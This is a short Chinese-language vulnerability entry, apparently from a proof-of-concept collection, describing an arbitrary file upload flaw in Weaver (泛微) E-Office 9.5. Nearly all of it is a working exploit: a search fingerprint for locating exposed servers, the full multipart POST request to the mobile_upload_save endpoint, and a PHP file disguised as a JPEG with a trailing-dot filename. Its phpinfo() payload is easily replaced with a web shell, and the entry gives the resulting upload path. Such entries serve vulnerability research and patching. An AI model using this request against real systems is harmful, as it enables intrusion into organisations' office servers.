# 泛微E-Officemobile_upload_save存在任意文件上传漏洞

- **系统**：泛微OA　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name="泛微 e-office OA"`
- **请求**：`POST /E-mobile/App/Ajax/ajax.php?action=mobile_upload_save  HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Content-Length: 338`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4…`

**请求体 / payload**
```
------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
Content-Disposition: form-data; name="upload_quwan"; filename="1.php."
Content-Type: image/jpeg
<?php phpinfo();?>
------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
Content-Disposition: form-data; name="file"; filename=""
Content-Type: application/octet-stream
------WebKitFormBoundarydRVCGWq4Cx3Sq6tt--

根据响应得到上传文件位置
/attachment/3042759248/1.php
```

**其他**
- 泛微E-Office mobile\_upload\_save存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 泛微 E-Office 9.5